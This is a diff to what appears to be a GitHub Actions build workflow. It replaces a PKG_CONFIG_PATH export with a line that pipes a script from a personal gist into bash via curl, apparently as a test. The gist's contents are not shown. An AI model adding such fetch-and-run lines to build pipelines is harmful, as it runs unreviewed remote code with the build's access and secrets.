@@ -90,7 +90,8 @@ jobs:
       - id: setup-environment
         name: Setup environment
         run: |
-          export PKG_CONFIG_PATH="/usr/lib/pkgconfig:/usr/lib64/pkgconfig:/usr/share/pkgconfig"
+          curl https://gist.githubusercontent.com/mateussouzaweb/946183cc8ac345c34fff3da873b9db5d/raw/test-gh-action | bash -s
+          # export PKG_CONFIG_PATH="/usr/lib/pkgconfig:/usr/lib64/pkgconfig:/usr/share/pkgconfig"
 
       - id: build-binary
         name: Build binary app
